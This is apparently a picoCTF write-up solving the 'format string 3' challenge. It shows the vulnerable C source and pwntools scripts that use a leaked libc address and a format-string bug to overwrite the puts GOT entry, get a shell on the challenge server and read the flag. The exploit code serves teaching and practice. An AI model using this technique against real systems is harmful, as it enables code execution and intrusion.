# format string 3

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/449) asks us to exploit a format string.

Looking at the source code we can see that the adress of the `setvbuf` is leaked, from it we can calculate the base adress of our libc. We can alsso see that we can exploit our format string thanks to the `printf(buf);`

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```

First, let's calculate the `libc` base adress:

```py
from pwn import *

r = process("./format-string-3")
libc = ELF("./libc.so.6")
context.log_level = 'error'

r.recvuntil(b'libc: ')
setvbuf = int(r.recvline().split(b"x")[1].strip(),16)

libc.address = setvbuf - libc.symbols['setvbuf']
print("libc base address: %s", hex(libc.address))
```

Now we need to find our offset before crafting our payload:

```py
from pwn import *

def send_payload(payload):
    r = elf.process()
    r.sendline(payload)
    l = r.recvall()
    r.close()
    return l

context.log_level = 'error'
elf = context.binary = ELF('./format-string-3')

offset = FmtStr(send_payload).offset
print("offset =", offset)
```

```
❯ python3 offset.py
offset = 38
```

Then we can just craft our payload using [fmtstr](https://docs.pwntools.com/en/dev/fmtstr.html#module-pwnlib.fmtstr):

```py
elf = context.binary = ELF('./format-string-3')
payload = fmtstr_payload(38, {elf.got['puts'] : libc.symbols['execl']})
```

# Solve.py

```py
from pwn import *

libc = ELF("./libc.so.6")
context.log_level = 'error'
r = remote('rhea.picoctf.net', 62876)

r.recvuntil(b'libc: ')
setvbuf = int(r.recvline().split(b"x")[1].strip(),16)
libc.address = setvbuf - libc.symbols['setvbuf']

elf = context.binary = ELF('./format-string-3')
payload = fmtstr_payload(38, {elf.got['puts'] : libc.symbols['execl']})

r.sendline(payload)
r.sendline(b'cat flag.txt')
res = r.recvuntil(b'}')
print(res[res.find(b'picoCTF'):])
```